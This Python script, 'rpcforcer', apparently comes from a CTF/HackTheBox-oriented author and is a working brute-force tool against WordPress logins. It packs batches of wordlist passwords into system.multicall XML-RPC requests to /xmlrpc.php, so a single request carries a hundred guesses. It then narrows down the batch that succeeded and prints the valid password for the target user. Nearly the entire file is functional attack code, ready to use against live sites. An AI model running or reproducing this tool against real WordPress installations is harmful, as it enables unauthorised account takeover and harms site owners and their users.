#!/usr/bin/python3

'''
https://fexsec.net
https://github.com/fexsecc
https://app.hackthebox.com/users/1842563
'''

import argparse
import requests
import threading
from colorama import Fore, Style
import urllib3

urllib3.disable_warnings() # disable self signed tls certificate warning, for ctfs and homelabs
class Forcer:
    def __init__(self, url: str, wordlist:str, port: int=0, user='admin'):
        self.url = url
        self.wordlist = wordlist
        if port:
            self.url += ":" + str(port)
        self.user = user
    
    def craft_req_body(self):
        self.start = '''
            <?xml version="1.0"?>
    <methodCall>
    <methodName>system.multicall</methodName>
    <params>
      <param><value><array><data>
      '''
        self.end = '''
    </data></array></value>
    </param>
    </params>
    </methodCall>
    '''
        body = self.start
        self.cnt = 1
        with open(self.wordlist, "r", errors='replace') as list:
            lines = list.readlines()
            for p in lines:
                body += f'''
                    <value><struct>
                  <member>
                	<name>methodName</name>
                	<value><string>wp.getUsersBlogs</string></value>
                  </member>
                  <member>
                	<name>params</name><value><array><data>
                	<value><array><data>
                	<value><string>{self.user}</string></value>
                	<value><string>{p.strip()}</string></value>
                	</data></array></value>
                	</data></array></value>
                  </member>
                  </struct></value>
                '''
                self.cnt += 1
                # %ing by number of requests send at once, modify this depending on servers power
                if self.cnt % 100 == 0 or p == lines[-1]:
                    body += self.end
                    self.send_request(body)
                    body = self.start
        list.close()
    
           
    
    def send_request(self, body):
        req_url = self.url + "/xmlrpc.php"
        self.headers = {'Content-Type': 'application/xml'}
        with requests.post(req_url, data=body, headers = self.headers, verify=False) as r:
            if "Automatically populating" in r.text:
                self.fetch_password()
    
    def fetch_password(self):
        self.cnt -= 1
        req_url = self.url + "/xmlrpc.php"
        with open(self.wordlist, "r", errors='replace') as w:
            p = w.readlines()
            for i in range(self.cnt, self.cnt+100):
                body = self.start
                body += f'''
                    <value><struct>
                  <member>
                	<name>methodName</name>
                	<value><string>wp.getUsersBlogs</string></value>
                  </member>
                  <member>
                	<name>params</name><value><array><data>
                	<value><array><data>
                	<value><string>{self.user}</string></value>
                	<value><string>{p[i].strip()}</string></value>
                	</data></array></value>
                	</data></array></value>
                  </member>
                  </struct></value>
                '''
                body += self.end
                with requests.post(req_url, data=body, headers = self.headers, verify=False) as r:
                    if "isAdmin" in r.text:
                        print(Fore.GREEN)
                        print(f"[+] Password found: {p[i].strip()}")
                        print(Style.RESET_ALL)
                        quit()


    def test_valid(self):
        req_url = self.url + "/xmlrpc.php"
        with requests.post(req_url, {"a":"b"}, verify=False) as test:
            if test.status_code != 200:
                print(Fore.YELLOW)
                print(f"[!] Expected code 200, but got {test.status_code} instead! quitting...")
                print(Style.RESET_ALL)
                return 1
            else:
                print(Fore.GREEN)
                print(f"[+] url is valid, starting to bruteforce {req_url}. This may take a while...")
                print(Style.RESET_ALL)


def args_to_class():
    example_usage = '''example usage:
        ./rpcforcer.py -u john https://example.com /opt/wordlists/rockyou.txt -p 8443
        python3 rpcforcer.py http://example.com /opt/wordlists/rockyou.txt'''

    parser = argparse.ArgumentParser(prog='rpcforcer',
                                    description='brute force wordpress logins with xmlrpc',
                                    epilog=example_usage,
                                    formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-u', '--user', metavar='user', type=str, help='user to bruteforce (defaults to admin)')
    parser.add_argument('base_url', type=str, help='base url in https://example.com format')
    parser.add_argument('wordlist', type=str, help='wordlist file path')
    parser.add_argument('-p', '--port', type=int, help='port number (if not default 80/443)')
    args = parser.parse_args()
    
    if args.user:
        return Forcer(args.base_url, args.wordlist, args.port, args.user)
    else:
        return Forcer(args.base_url, args.wordlist, args.port)

def banner():
    print(Fore.BLUE)
    print('''
     ____             _____                       
    |  _ \ _ __   ___|  ___|__  _ __ ___ ___ _ __ 
    | |_) | '_ \ / __| |_ / _ \| '__/ __/ _ \ '__|
    |  _ <| |_) | (__|  _| (_) | | | (_|  __/ |   
    |_| \_\ .__/ \___|_|  \___/|_|  \___\___|_|   
          |_|                                     
    https://fexsec.net
    ''')
    print(Style.RESET_ALL)

def main():
    banner()
    forcer = args_to_class() # convert arguments into a neat class
    if forcer.test_valid(): # check for the /xmlrpc.php path
        return 1
    forcer.craft_req_body() # start bruteforcing
    
if __name__ == "__main__":
    main()
